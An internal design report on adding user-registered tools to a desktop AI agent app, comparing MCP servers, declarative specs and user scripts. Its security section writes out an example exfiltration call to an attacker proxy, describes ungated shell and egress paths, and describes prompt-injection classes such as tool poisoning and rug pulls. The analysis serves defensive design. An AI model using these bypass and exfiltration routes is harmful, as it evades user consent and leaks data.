---
status: current
last-verified: 2026-11-26
verified-by: local + web research — 6 angles (4 local-code, 1 web prior-art, 1 web security), 2026-11-26; every load-bearing local claim re-read at HEAD `adec7dbe`, three of them re-verified by the synthesiser personally
task: tsk_0e965353-d408-4fde-ac08-dcca18bab313
---

# No way to add a tool without a desktop release — the host-tool seam takes data but nothing supplies it

## The settled question

> Given that ADR 0102 made a **Host tool**'s spec travel to the engine as data, what would it take for a **person** to add a tool without a desktop release — and of the three candidate registration kinds (a declarative spec, a user script, an external MCP server), which should this product adopt for an **end user extending their own desktop**, holding the third-party-extension case as a future constraint rather than a present requirement?

This is a decision report, not a survey. The answer is a **tier split**, and the report's job is to make that split defensible.

**Citation decay.** Per `docs/agents/test-counts-and-splits.md`, a `file:line` into a moving desktop file decays. Desktop paths were re-opened at `adec7dbe` (the `#220` squash commit). Crate paths cite the **published** `fulcrum-harness 0.8.0` at `~/.cargo/registry/src/index.crates.io-*/fulcrum-harness-0.8.0/src/`, which one researcher verified byte-identical to the sibling checkout at its `v0.8.0` tag (`diff -rq src` clean), so each crate citation resolves in either tree at the same line. Abbreviations below: `fulcrum:` is that crate, `archimedes:` is this repo.

---

## Executive summary

The card's premise is **half wrong in a useful way**.

The seam is **more** registration-shaped than the card believes. Of the twenty sites on the host-tool path, **eighteen are name-agnostic** — they map over a `Vec` or carry a `String`. Adding *N* tool names today needs **zero crate change and zero protocol change**. The hard-coding reduces to one `match` on seven string literals plus the `vec![…]` that builds the specs.

But the card's central open question — *what can a registered tool execute?* — turns out to have an **evidence-backed answer rather than an open decision**, because the three kinds differ by roughly an order of magnitude in cost and two of them are already built.

**The answer is not "pick a mechanism." It is a tier split by what the tool's substance touches:**

| Tier | Registration kind | Status | Cost |
|---|---|---|---|
| **1** | **MCP server** — for tools whose substance is **external** (an API, a SaaS, a device) | **Already the registration mechanism.** Needs five small desktop fixes + documentation, not a feature | ~15–25 TSX lines for the one real gap; the rest is prose |
| **2** | **Declarative spec from disk** whose executor is a **name the desktop already implements** | Buildable **desktop-only**, one commit, no publish, no protocol change | One repo. Blocked on one prerequisite (§F5a) and one missing field (§F6b) |
| **3** | **A user script** as the executor | **Recommend declining, in an ADR.** Not defensible at the shipped default posture without four named gate changes, and even then its ceiling is "the Worker is lost" | A new subsystem + a new security story |
| **4** | A **confined helper process** (the third-party case) | Future constraint, not a present requirement | Linux ~90% built; Windows is a project |

Two further results worth reading before any design:

- **A live defect on behaviour that shipped last week** (§F5d): a default-configuration **Session's child Subagent session gets 17 engine tool names and zero of the seven board verbs**, while a parent with an *explicitly restrictive* `enabled_tools` list that *names* a host verb does pass it down. **The less restrictive setting produces the narrower child.** This is a **fourth** `tool_specs()` read site; ADR 0102 §2.3 names two and its amendment names a third. Nobody names this one and no test covers the branch. It is independent of registration and belongs on its own card.
- **The market converged twice, in the same direction** (§F3): on the **external server** as the registration artifact, and on the finding that **a declarative spec is a wire format, not an extension mechanism** — every model vendor says in their own words that the host executes. OpenCode is the only product shipping a real "register a tool in a JS file" API, and it is also the only one with no install consent and an allow-everything default policy. The two facts co-occur.

---

## Findings

### F1 — The seam is registration-shaped except for exactly one `match`

The end-to-end path, with the one axis that matters (does this site need editing to add a name?):

| # | Site | Name-agnostic? |
|---|---|---|
| 1 | `archimedes:src-tauri/src/agent/host_tools/specs.rs:49` — `specs() -> Vec<ToolSpec>` builds seven inline struct literals | **No** — a hand-written literal |
| 2 | `archimedes:…/host_tools/mod.rs:76` — `host_tool_specs()`, the sole owner | Yes (pass-through) |
| 3 | `archimedes:…/agent/session/mod.rs:1791` — `env.with_host_tools(host_tool_specs())`, the single envelope hop, reached by both `start_session` and `resume_session` | Yes |
| 4 | `fulcrum:src/worker_types.rs:386` — `pub host_tools: Vec<ToolSpec>`, `#[serde(default)]`, wire key `hostTools` | Yes |
| 5 | `fulcrum:src/worker/manager/mod.rs:239-251` — the envelope crosses the JSONL pipe **and** is retained in the registry (that copy is what a child inherits) | Yes |
| 6 | `fulcrum:src/worker/core.rs:414-423` — `builtins()` ++ `host_entries_attached(env.host_tools, channel)` | Yes |
| 7 | `fulcrum:src/worker/host_tools.rs:164` — replaces only `entry.executor`, per-entry, using the entry's own name | Yes |
| 8 | `fulcrum:src/tools/exec/registry.rs:513-536` — `host_entries`: partitions against `tool_specs()`' names, **drops** collisions loudly, maps the rest | Yes (but reads a hard-coded name set) |
| 9 | `fulcrum:src/harness/loop.rs:2176-2217` — `advertised_tool_specs`: table ++ registry entries the table lacks, engine-first dedupe, then the `enabled_tools` filter | Yes |
| 10 | `fulcrum:src/harness/prompt.rs:61-73` — renders the advertised set into `<tools>`; the same vec goes out as `tools[]` | Yes |
| 11 | `fulcrum:src/harness/loop/tools.rs:174` — `lookup(&self.tool_registry, …)` runs **before** the loop-arm `match` at `:184` | Yes |
| 12 | `fulcrum:src/worker/host_tools.rs:189` — `call_host_tool`: mints `host-{uuid}`, registers the pending entry **before** emitting, parks racing `ctx.cancel` | Yes |
| 13–14 | `fulcrum:src/worker/protocol.rs:382-388` `Outbound::HostToolCall { request_id, session_id, tool: String, params }` → `fulcrum:src/worker/manager/pump.rs:91-102` | Yes — `tool` is a `String` |
| 15–16 | `archimedes:…/agent/session/router.rs:319-444` → `:408` `host_tools::run(&db, &tool, params)` | Yes — no `match` on `tool` in the arm |
| **17** | **`archimedes:…/host_tools/exec.rs:86-99` — `match tool { "list_board" => …, …, other => Err(…) }`** | **No — the only closed door** |
| 18 | Each arm: param extraction → `spawn_board(verb, …)` under `TASK_BOARD_CALL_TIMEOUT = 30 s` → a written-out DTO → `to_details(key, …)` | **No** — per verb |
| 19–20 | `Inbound::HostToolResponse { request_id, result }` → the oneshot resolves | Yes |

The `other =>` arm is a **loud refusal, not a park** — `HostToolError::Invalid`, pinned by `an_unknown_tool_name_refuses_loudly_rather_than_parking` (`archimedes:…/host_tools/tests/verbs.rs:295`). Its own doc states the drift contract: reaching it "means the two lists drifted apart."

**Everything between step 2 and step 19 needs no change at all for an eighth name.**

Four other hard-codings exist and only the first matters:

- `HOST_TOOL_NAMES: [&str; 7]`, the sorted 26-name literal, `assert_eq!(engine.len(), 19)` and `names.len() == 26`, and a per-verb param table — all in `archimedes:…/host_tools/tests/surface.rs:19,81-124,160-184`. A census to update, deliberately spelled as a literal so the assertion is not tautological.
- `commands/settings.rs:899-923` names the seven in a **subset** loop and derives its length assertion (`tool_specs().len() + host_tool_specs().len()`), so an eighth verb does **not** redden it.
- `fulcrum:src/harness/tool_specs.rs:1860-1868` `HOST_BOUND_SET` is a frozen seven-name `#[cfg(test)]` fixture whose own doc admits it is "a FROZEN FIXTURE standing in for what the desktop puts in `StartEnv.host_tools`". The crate is pinned, so the desktop cannot edit it and need not — but its doc's claim to describe the desktop's list silently becomes false as the desktop grows.
- `d2_ships_the_artifacts_block_and_the_verbs_that_answer_it_together` (`archimedes:…/commands/tasks/tests/artifacts.rs:470-495`) scans `specs.rs` for two names only; its `registration` needles are signature-shaped, not name-shaped.

**`ToolSpec` is three fields and derives `Deserialize`** (`fulcrum:src/provider_types.rs:149-156`: `name`, `description`, `parameters: Value`). So `serde_json::from_str::<Vec<ToolSpec>>(&text)` on a `tools/*.json` file **compiles and works today, desktop-only, no new type**; the round-trip is already pinned (`fulcrum:src/worker/protocol.rs:2515-2546`). `parameters` is a raw `Value` precisely so an arbitrary JSON Schema round-trips.

**What the file cannot express is who answers the call.** `ToolEntry`'s `executor: Arc<dyn ToolExecutor>` and `script: ScriptAccess` are `pub` but never cross the wire, and `ToolSpec` has no dispatch field. **A JSON file on disk therefore yields an advertised-and-dead tool** unless the desktop also ships an arm keyed to that name — the exact failure ADR 0102's `every_advertised_tool_reaches_an_executor` census exists to catch.

**Nothing validates a host spec's shape beyond name collision.** No charset or length rule on `name`, no non-empty `description` rule, no check that `parameters` is an object or valid JSON Schema. A spec with `"parameters": "banana"` is advertised verbatim into the `<tools>` section and the provider request.

**Script reach is automatic and not opt-out-able.** `host_entries` sets `script: ScriptAccess::Allowed` for every accepted spec (`fulcrum:src/tools/exec/registry.rs:532`, documented as a *preservation rule*, not a default — ADR 0092's "one `roadmap` script creating N Tasks" property), `host_entries_attached` replaces only the executor, and `script_access()` falls through to `.unwrap_or(ScriptAccess::Allowed)` for any name the crate has never named (`:609-618`), whose doc says that fall-through "is load-bearing for F2." So **a user-registered tool is immediately callable and discoverable from a `codemode` script**, and the registrant cannot opt out short of editing the pinned crate.

### F2 — MCP already *is* the registration mechanism, and the split is capability, not convenience

**Adding a server is a JSON edit or a Settings form. No rebuild, no crate release.** Four doors:

| Layer | Path | Precedence |
|---|---|---|
| pi-global | `<$HOME>/.pi/agent/mcp.json` | lowest |
| **desktop** | `settings.json` → `mcpServers` (rides the `StartEnv`, see below) | middle |
| pi-project | `<space cwd>/.pi/mcp.json` | **highest** |

The merge and the three layers live in the crate (`fulcrum:src/mcp/config.rs:36-55`); the *disk* is the desktop's (`archimedes:src-tauri/src/config.rs:26` — "The engine has the shape of the settings; the desktop has the file"). And `<space cwd>/.pi/mcp.json` means **per-Space MCP configuration already ships today**, at the highest precedence.

The Settings surface is real: `archimedes:src/components/settings/McpSection.tsx` (478 lines) with a per-row **Test** (one-shot 10 s bounded connect) and **Authenticate**, and precedence copy that already says "Space > desktop > user".

**The marginal context cost of a user's first server is zero**, because the ~280-token `mcp` proxy spec is advertised unconditionally whether or not any server exists. The model reaches an MCP tool through `mcp` and through `codemode`'s `searchTools`/`describeTool` (which report `kind:"mcp"` and a `callable` string) — but **never** as `tools.<name>`, because `ALL_TOOLS` is built from `advertised_specs()`.

**ADR 0092's rejection of "MCP for host tools" does not transfer to a user tool.** Its measured reason was that a **Task board** is per-**Space** while MCP config is app-global, so a child must be told which Space it belongs to — a requirement an arbitrary user tool does not have, and one that is not even literally true of the config surface given the project layer above. The process-boundary/`Db` half is likewise beside the point: an external-capability tool has no `Db` to reach.

**Its second, co-equal reason does transfer, and I verified all three invisibility claims in 0.8.0:**

| ADR 0102's claim | Verdict | What is sharper than the sentence |
|---|---|---|
| invisible to the **Permission prompt** | **Holds — and worse** | `POLICIED_TOOLS` is exactly `bash read find grep ls write edit` (`fulcrum:src/harness/loop/gate.rs:18-26`, personally re-verified), and `policy_verdict` opens with `policed_direction(&tc.name)?`. The only name the model can emit is `mcp`; the server tool is a string *inside* its arguments, so there is no judgeable identity at all. `mcp: deny` in an agent definition is a **total no-op at both layers** — no `ToolKey::Mcp` variant, *and* the consult is never reached. |
| invisible to **`enabled_tools`** | **Holds** | Unchecking `mcp` works end to end. **No `enabled_tools` value means "not this server" or "not this tool."** `disabled: true` is honoured by the engine (`fulcrum:src/mcp/types.rs:280-282`) and declared on the wire type (`archimedes:src/lib/tauri/types.ts:1175`) but has **no Settings control** — `McpDraft`/`entryToDraft`/`draftToEntry` never read or emit it. |
| invisible to **`list_tools`** | **Holds absolutely** | `list_tools` is stateless by design (`archimedes:…/commands/settings.rs:155-163`, no `State` param), so it *cannot* reach a per-session `McpManager`. `list_mcp_servers_effective` returns server names only, drops names that cannot be a mention token, and exists solely for the `#` picker. |

ADR 0092's amendment marks the MCP ruling **"NOT superseded"** while superseding almost everything else in the same ADR, and `CONTEXT.md:468` actively polices the vocabulary. This is a twice-reaffirmed judgement, not drift.

**Undocumented costs, both real.** (a) A new or edited server takes effect at the **next session**, not the running one: `push_config_update` deliberately excludes `providers` and `mcp_servers` (`archimedes:…/agent/session/router.rs:888-889`, "the recorded residual hole") and `apply_config_update` has no `mcp_servers` parameter. Nothing tells the user. (b) One `mcp({search})` calls `list_tools` on **every** configured server before answering (`fulcrum:src/mcp/tool.rs:121-141`) under a 60 s per-request bound each — a five-server config can spawn four children and wait serially. Idle cost is near zero (lazy connect; an untouched server spawns nothing).

**Tool annotations are discarded at the transport boundary.** The MCP spec defines `readOnlyHint` / `destructiveHint` / `idempotentHint` / `openWorldHint` (defaulting `destructiveHint` to **true**) with the explicit warning that clients "should never make tool use decisions based on ToolAnnotations received from untrusted servers." `ToolInfo` is three fields and both `list_tools` parsers pick exactly those three (`fulcrum:src/mcp/{stdio.rs:266-276,http.rs:327-337}`); `grep -rn annotations` across the crate **and** the desktop returns **0 hits**. And even if read, there is no gate for them to plug into.

**Verdict: sufficient for external-capability tools, structurally insufficient for host-mutating ones** — and that is a capability boundary, not a defect. ADR 0030 already says it out loud: "`sudo_exec` and the MCP tools sit outside the policy … `Shell = Sandboxed` confines `bash` and nothing else."

### F3 — The market converged, twice, in the same direction

**Convergence 1 — the external server wins.** Every product that lets a person add a tool without a release does it with a `mcpServers` JSON entry whose keys are the same five or six everywhere (`command`/`args`/`env` or `url`/`headers`): Claude Code, Cursor, Windsurf, Cline, Continue, OpenCode (whose MCP tools surface as `<server>_<tool>` permission actions), and ChatGPT/Codex plugins — whose tool-bearing component *is* an MCP server. Continue will even ingest another client's config file verbatim. VS Code — the most manifest-heavy product surveyed — tells its own tool authors to **prefer an MCP server** if they do not need editor APIs.

Why the server won, in the products' own terms: it is the only shape where **the host never runs user code**, so the trust question collapses to "do you want to talk to this thing," which is a question a user can actually answer.

**Convergence 2 — a declarative spec is a wire format, not an extension mechanism.** All three model vendors say the same thing about their own API: Anthropic — "*Client tools … run in your application… Your code runs the operation*"; OpenAI — "*Execute code on the application side with input from the tool call*"; Gemini — "*The model **doesn't** execute the function itself.*" VS Code says it of itself: "*The LLM never actually executes the tool itself.*" A spec has no executor, so there is nothing to gate; it only helps whoever already has one — i.e. the host. That is exactly the Tier 2 framing in §F6b, and it is why "spec-only" is a real tier here rather than a non-option.

**OpenCode is the counter-example and it is instructive.** It is the only product shipping a genuine in-process "register a tool in a JS file" API (V1 `tool({description, args, execute})` with Zod; V2 `Plugin.define({setup(ctx)})` + `ctx.tool.transform(e => e.add({name, description, input}))`, Zod → JSON Schema, namespaced, later-registration-wins). It is also the only one with **no install-time consent, a shipped base policy of `{action:"*",resource:"*",effect:"allow"}`, unpinned plugins that self-update on startup and every 24 h, and a permission-action namespace that plugins may add to.** The two facts co-occur.

**Three laws hold across every product surveyed:**

1. **Nobody gates the *tool*.** They gate the **folder** (Claude Code's workspace trust, VS Code Workspace Trust), the **publisher** (VS Code's signing + malware + dynamic scan + force-uninstall; Obsidian's default-off Restricted Mode + automated scan of every version + no auto-updates), or the **action** (Cursor's `mcpAllowlist`, OpenCode's `action/resource/effect`). Tool-level consent appears only as *auto-approval lists* — an exemption from a per-call prompt, which is the inverse of a trust grant (Cline's per-server `autoApprove`).
2. **Prompt-every-call is the default everyone races to remove.** Cursor asks before every MCP tool call by default and shipped an LLM classifier to stop asking; OpenCode defaults to allow-all; Archimedes' own ADR 0030 landed on `Allow` for all three directions. The safety argument has migrated to **admin allowlists that fail closed** (Windsurf: one allowlisted entry blocks everything else) and to **sandboxes that explicitly do not cover the extension code** (Claude Code: hooks, MCP servers and plugin processes run "with your full user permissions… outside the sandbox").
3. **Project-directory registration is handled exactly two ways and only two ways.** Either a human approves once and **repo-committed approvals are void until the folder is trusted** (Claude Code's `.mcp.json` approval + workspace trust + `reset-project-choices`; Codex hooks loaded only from trusted project layers), or it is allowed and the blast radius is **declared out loud** (OpenCode, Cline, Continue). Nobody lets a cloned repo self-approve its own tools.

**The one genuinely transferable idea** is Codex's hash-pinned consent: *"Installing or enabling a plugin doesn't automatically trust its hooks… Codex records trust against the hook's **current hash**, so new or changed hooks are marked for review and skipped until trusted."* That is the shape a per-tool grant wants here, and it is the direct answer to the **rug-pull** attack class (§F4e).

**What the manifest-heavy end teaches about *not* wanting a manifest.** VS Code's `package.json` + `activationEvents` exist for **deferred activation** and **declarative contribution discovery without running code** — startup cost and UI wiring, not safety. Its safety came entirely from the **central registry**, which is an institution, not a file format. A local-directory extension system inherits none of it. Microsoft's own numbers: 136 extensions reviewed for malice and 110 removed in one year, with a live public removal ledger.

### F4 — The script tier's ceiling is "the Worker is lost," and QuickJS says so in the vendored source

**What is genuinely good, verified in the build:**

`rquickjs = "0.14.0"` with features `["futures","parallel"]`, vendoring **QuickJS-NG 0.16.2**. `rquickjs-sys-0.14.0/build.rs:143` compiles **only** `["libregexp.c","libunicode.c","quickjs.c","dtoa.c"]` — I measured `grep -c quickjs-libc build.rs` → **0**. So the `os` and `std` modules (file access, signals, timers, subprocess spawn, stdin) **do not exist in this binary**. No module loader, no `require`, no `JS_ReadObject` bytecode path. Limits: 256 MiB QuickJS-managed memory, 256 KiB stack, 300 s wall clock, plus two-part cancellation (an uncatchable interrupt every 10 000 bytecodes *and* a `race_turn` select). A script gets **no** `Db` (ADR 0025 — the Worker has none), **no** config dir (`ToolCtx` has no such field), **no** readable provider key (search keys ride `ToolCtx.web` and are only ever passed *to* a tool).

**And the nested-call gate claim is true.** `Bridge::run_nested` synthesises a real `ToolCall` and runs the same five steps in the same order as `turn.rs:1312` — cancellation, `is_tool_enabled`, unknown-parameter rejection, `interactive_args`, then `policy_verdict` → `gate_tool`/`deny_tool` — with byte-identical refusal wording. Exclusion is enforced three times over (absent from `ALL_TOOLS`, `describe_tool` refuses, explicit refusal in `dispatch_nested`).

**None of that is the problem.** The problem is that the gate is **consent over the user's own OS authority, not containment**:

| Hole | Evidence |
|---|---|
| At shipped defaults the gate **never asks** | `AccessPolicy`'s `#[default]` is `Allow` (`fulcrum:src/policy.rs:23-31`), `FilePolicy` derives `Default`, so `reads`/`writes`/`shell` are all `Allow` and `decision_for` answers `Allow` silently. `tools.bash({command})` from a script dispatches with **zero prompts**, running `sh -c`/`cmd /d /s /c` at the user's full permissions. Rules never apply to `bash`. |
| `mcp` and both web tools are **ungated** | `POLICIED_TOOLS` is seven names. A script's `tools.mcp({action:"call_tool",…})` spawns stdio children with **no prompt ever**. ADR 0089's own residual risk is "process fan-out through a permitted tool." |
| A script chooses its own egress path | `web_search` advertises a caller-supplied `proxy` reaching `reqwest::Proxy::all` (`fulcrum:src/web/net.rs:253`); the SSRF guard rejects private/loopback but an attacker-chosen **public** proxy passes. **Inference — mechanism code-verified, end-to-end not tested:** `tools.web_search({query:<stolen data>, proxy:"http://attacker/"})` is a no-prompt exfiltration channel that also carries the configured search API key. `bash` achieves the same more simply at defaults. |
| **No budget of any kind** | No call counter, no rate limit, no child-process cap, unbounded `details.calls`. A nested `bash` accepts `timeout_ms` up to 15 min — 3× the script's own 300 s. |
| Off-Linux there is **no OS confinement at all** | `tools/sandbox.rs` is Linux-only Landlock; non-Linux + `Sandboxed` returns "unavailable on this platform" (fail-closed, correct). And even on Linux `handled_access_net` is **0 at every ABI** — "a confined command can still `curl` out with anything it was allowed to read." |

ADR 0089 states the design honestly: the limits exist "so that a *bug* cannot wedge the Worker, not to contain an adversary." **That is the right model for model-authored `codemode` and the wrong model for adversarial user-authored code.**

**The engine's own vendored `SECURITY.md` names the assumption a user script breaks:** *"The bug must be reachable from untrusted JavaScript source running in an **otherwise trusted embedder**."* And: *"QuickJS bytecode is not designed for adversarial input… crashes, memory corruption, or **sandbox escapes**… are not considered security vulnerabilities."* Measured today: 33 CVEs on NVD for `quickjs`, 31 OSS-Fuzz findings, a 2025-10 cluster of five at CVSS 8.8 in `js_print_object`, string `+` type confusion, integer overflow in **libregexp**, and BigInt parsing — i.e. reachable from plain JS source, inside the stated threat model. Zero Rust advisories for `rquickjs` on crates.io, but SurrealDB's "Poison Pill" (GHSA-XX7M-69FF-9CRP) shows bindings carry CVEs with an empty crates.io advisory record.

**The strongest prior art is almost this exact product shape.** NebuSec on Telegram's QuickJS widgets (bot-supplied JS in QuickJS inside a desktop/mobile app): RCE in one day; Telegram's move-to-a-process + seccomp fix bypassed **two days later**; their seccomp filter was a **denylist of ~30 calls** and "everything else including every `ioctl` got through." Their conclusion: "QuickJS was not designed to run untrusted code… **assume the engine is already compromised, and design for what the attacker holds next**." Four layers: dedicated process, SFI (RLBox), a **tainted return boundary**, allowlist seccomp.

**No JS engine choice buys a boundary.** Measured on crates.io: `rquickjs` 0.14.0 (its own README says the `parallel` feature this app depends on "may not works as expected. Use it for your own risk"), `boa_engine` 0.22.0 (pure Rust, so no C memory-safety class at all — ADR 0089 rejected it on async/host-promise interop, still the right read), `deno_core` 413.0 and `v8` 152.2.0 (**V8 isolates are context separation, not a security boundary** against a compromised V8), `deno_runtime` 268.0 (a real permission model, but the whole runtime), `quick-js` 0.4.1 last published **2021**. The engine choice is about JS quality and host-await ergonomics, where rquickjs is genuinely the best fit.

**OS confinement, per OS:**

- **Linux** — already done and child-installed via `pre_exec`. The work is adding net rights (`TCP` ABI 4, `UDP` ABI 10) and a per-helper profile, not adopting bubblewrap: Ubuntu 23.10/24.04's AppArmor unprivileged-userns clampdown breaks non-setuid bwrap (Launchpad #2162115; openai/codex#14919). **Cheapest leg by far.**
- **macOS** — the weakest position. `sandbox-exec`/Seatbelt is marked **Deprecated** in its own man page (and still used by Claude Code's sandbox runtime). App Sandbox is entitlement-based and would be a **distribution-model change**, not a code change — this app ships a dmg plus a minisign updater from GitHub releases. And a spawned child inherits the parent's sandbox regardless of the `inherit` entitlement, so "spawn a helper" buys nothing new; Apple's own guidance is that a `posix_spawn` child "does not provide the security afforded by using an XPC service."
- **Windows** — no off-the-shelf answer, and OpenAI already tried. Their write-up on enabling Codex on Windows evaluated and **rejected** AppContainer ("a much narrower class of workloads than 'let an agent operate like a developer'"), Windows Sandbox ("isn't even available on Windows Home SKUs") and Mandatory Integrity Control ("turns the user's actual checkout into a low-integrity sink for the host"). Their shipped design is a synthetic SID + write-restricted token + targeted ACLs, and even they found un-elevated **network blocking to be advisory only**.

**Tauri closes the "express it as a plugin" door.** Tauri 2 replaced the v1 allowlist with capabilities/permissions JSON enforced by a runtime authority, and states plainly what it does *not* protect against: "Malicious or insecure Rust code," lax scopes, incorrect scope checks, "basically anything which was written in the rust core." The decisive sentence: *"Any code executed by the plugins or the application core has full access to all available system resources and is not constrained."* **Tauri plugins are compiled-in Rust crates**, so a "user-registered tool expressed as a Tauri plugin" is not a user-code channel at all. This repo's `capabilities/default.json` grants only `core:default`, `dialog:default`, `opener:default` and four `core:window:*`, and **`tauri-plugin-shell` is not installed** — so the renderer cannot spawn processes and the user-code risk lands in the **Worker**, which is exactly where `codemode` already runs.

**What is already reusable here** (more than expected): the **per-Space trust bit** (`spaces.trusted`, `SqliteTrustSource`, fail-closed, `default_trust_new_spaces = false`) is a working Workspace-Trust analogue; a **persisted per-target rule list** with a canonicalizer that has already survived two escape classes (#92 / ADR 0081), written by an `allow-directory` prompt click; the **narrowing-only, child-only `permission:` layer** (`Allow < Confine < Ask < Deny`, strictest wins) as a template for "a script may only ever narrow"; and the **self-modification guard** — writes into `~/.agents/{skills,agents}` and `~/.pi/agent/{skills,agents}` are `Ask` when no rule matches and are never widened by Trust, which is the closest existing analogue to "consent before installing something that changes the agent's behaviour." What does **not** exist is any notion of **provenance** for a tool, or a grant keyed to a specific script rather than to a path or a tool name.

Two landmines for any registration file: `settings.json` is **not** agent-write-proof and already holds `filePolicy`, and it has **six-plus whole-document writers with no shared lock**, so a Settings Save can silently drop a just-appended entry. Both are recorded and unfixed.

**Prompt injection widens in two ways with user-authored tools.** (1) **Tool-description poisoning** — a user spec's `description` reaches the model verbatim through `advertised_specs()` into `<tools>`. This is a named attack class (tool poisoning, **tool shadowing**, **rug pull** = the description changes after approval). The repo's census (`the_codemode_description_never_names_another_advertised_tool`; the `read`/`subagent` ban) is a **copy ban on engine-authored strings**, not a sanitizer for user-authored ones. (2) **Script output injection** — every returned string is model-visible content from a source the model has no reason to distrust. Mitigations beyond per-call prompts exist and are stronger: break the **lethal trifecta** (private data + untrusted content + external communication, one leg per script), a controller/privileged split (CaMeL lineage), a **tainted return boundary**, and per-script capability subsets. Per-call prompts are the weakest of these, and this app's own docs note approval fatigue is a real observed failure mode.

### F5 — Twenty surfaces: most already work; four fail silently, one of them today

**Graceful degradation works and is already exercised.** A tool with no registered reader renders as **wrench icon + its raw name + a truncated JSON blob of its arguments + a whole JSON dump of `details`** — four independent fallbacks (`toolVerb` → `undefined` → `{verb ?? title}`; `TOOL_ICONS[title] ?? WrenchIcon`; `summarizeToolCall`'s `default:` arm; `normalizeToolOutput`'s `JSON.stringify(result.details)`), no crash, no missing-key error. **All seven shipped host verbs already ship no rich reader** — none appears in `VERBS`, `TOOL_ICONS`, or `summarizeToolCall`'s switch. So a rich reader is **optional**, and card #16 (the four task keys have no reader) does **not** block registration: its *symptom* is closed by `useTaskBoardAutoRefresh`, and its registry half is deliberate and documented per key.

A **rich** reader is five coupled edits, two of them compile-time: `PRODUCER_KEYS` (39) + `FrozenProducerTuple` sealed by an `AssertEqual`, a Part-3 fixture group (both directions), `UNREAD_BY_NAME_REASONS` with a reason ≥20 chars (the key type is computed, so a missing reason **fails `pnpm build`**), the reader union re-numbered to 25 with the three-column partition test, and a Rust key-set equality arm in `host_tools/tests/shape.rs`. Note the coverage hole: **nothing detects a new producer key that was never added to `PRODUCER_KEYS`** — the list is a hand-frozen copy, `shape.rs` covers only the four existing payloads, and the crate's own copy is 34 keys, a divergence the files acknowledge but never measure.

**The Settings renderer needs zero change** — `GeneralSection.tsx:20` takes `tools: string[]` and renders `{name}` verbatim, with a comment recording that host tools are *deliberately* not badged. There is **no `ToolName` union anywhere in TypeScript**. The cost is that `list_tools` chains two hard-coded Rust literals.

| # | Surface | State today for a name nothing hard-codes |
|---|---|---|
| 1–3 | Engine compose → advertised set → dispatch | **Works** (drops + logs only for an engine-owned name) |
| 4 | `enabled_tools` disable | **Works** — with trap (b) below |
| 5 | Settings checkbox list | Renderer **needs nothing**; the **data source needs new code** |
| 6 | Stale `enabled_tools` entry | **Inert but sticky** — see (b) |
| 7 | Per-definition `permission:` gate | **Breaks silently** — see (c) |
| 8 | `permission:` announcement UI | **Works** — `unrecognised tool key: <name>` is visible in the Agents modal |
| 9 | `tools:` frontmatter narrowing | **Breaks, accepted** (card #46) |
| 10 | Child's `[]`-means-ALL expansion | **Breaks, undocumented — and it is broken today.** See (d) |
| 11 | Child envelope inheritance | **Works** (`subagent_flow.rs:945`, pinned) |
| 12 | `codemode` discover + call | **Works**, and unavoidably so (`ScriptAccess::Allowed`) |
| 13–14 | Engine-name guard + diagnostics sink | **Works** as a guard; the sink is a file |
| 15 | UI surfacing a dropped tool | **Needs new code — no plumbing exists at all** |
| 16 | Transcript card, no reader | **Degrades gracefully** |
| 17 | `details` registry (rich card) | **Needs new code, fails loudly** (2 compile-time) |
| 18 | TS wire mirror (`AgentToolKey`) | **Needs new code with no safety net** — the file states there is no wire-contract test linking the two sides |
| 19 | Barrel / fixtures / command guards | **Works** — four pinned lists, all fail loudly |
| 20 | Listing / validation / error UX precedent | **Exists to copy — at three inconsistent honesty levels** |

#### (a) The prerequisite: a dropped tool is invisible to the person it was dropped from

`host_entries` refuses an engine-owned name and records it to `eprintln!` + `diagnostics::record`, which writes `<data_dir>/archimedes/diagnostics.log` (rotated at 1 MiB). I confirmed against the full IPC surface (the `generate_handler!` block at `archimedes:src-tauri/src/lib.rs:455-640`, 79 commands) that **no command returns a log path, reads that file, or reveals it**, and the frontend has **zero** production hits for "diagnostics". The refused names are `{:?}`-escaped because a `record` call site may not contain user content — correct, and it also means the sentence is machine-shaped.

So a user who registers `bash` sees **a tool that vanished**. Card #47 named this requirement exactly, and it has no existing plumbing. **This is a prerequisite for every registration tier, not a nicety of one.** The honesty standard to adopt is the **agents** one (`AgentDefinition::frontmatter_notes` is a *required* `Vec`, crosses the wire, and is rendered per row, with the rule stated in the file: "an announcement the user cannot act on is noise, and noise trains people to ignore the feature") — not the **skills** one, which silently skips a malformed file at two named sites with no note at all. Three user-supplied resources currently ship three honesty levels: skills skip silently, agents announce, MCP tests on demand.

#### (b) A newly registered tool is silently dead under any restrictive list

Default `enabledTools: []` means ALL, so a newly registered tool is advertised immediately with no checkbox ever touched. But a user who has checked **any** box has a restrictive list, and the new tool is then **invisible to the model until checked** — and if `list_tools` does not include registered tools, **there is no row to check**. Installed, advertised-nowhere, dead, with no error. Related: a stale entry for a deleted tool renders **no row** (rows come from `list_tools`), so it cannot be unchecked, stays in `settings.json` forever, and silently governs any *later* tool that takes that name.

#### (c) The per-definition permission layer is parsed, announced, and inert

`ToolKey` has 11 recognised variants + `Unrecognized(String)` and names none of the seven host verbs. An unknown name in a `permission:` block is **not** a parse failure (the row is retained in file order, "kept verbatim so the ruleset stays REPRESENTABLE"), **is** announced as `FrontmatterNote::UnrecognizedToolKey`, and then **no-ops at the gate**: `tool_key_matches` matches `Unrecognized` by exact name so `definition_verdict` returns a real `Deny`, but `policy_verdict`'s first line discards it for any non-policed name. Pinned with a deliberate contrast pair by `a_host_tool_is_gated_exactly_as_the_board_verbs_are` (`fulcrum:src/harness/loop/tests/tools_enabled.rs:1390`), which asserts host and board verdicts are both `None` while `bash` on the same block is `Some(Deny)`. A whole-tool `deny` also fails to drop the name from a child's advertised set, because `tool_key_name` returns `None` for `Unrecognized`. This is card #45, and its `done-when` ("what a `deny` on `move_task` resolves to") **is now answered: silently no-ops at the gate.**

#### (d) NEW FINDING — the fourth `tool_specs()` read site, broken on shipped behaviour

`fulcrum:src/worker/manager/subagent_flow.rs:830-842` computes the child's tool set. When `wire.launch.tools` is `None` **and** `wire.parent_enabled_tools.is_empty()`, it expands to `tool_specs()` minus `subagent`/`list_agents` — **17 engine names, zero host verbs**. And `fulcrum:src/harness/dispatch.rs:346` shows `parent_enabled_tools` is empty exactly when the parent's `enabled_tools` is `None` (`.map(…unwrap_or_default())`) — **the shipped default** (`enabledTools: []`). That `Some(child_tools)` is then passed verbatim as the child's `enabled_tools` and filters the *composed* advertised set.

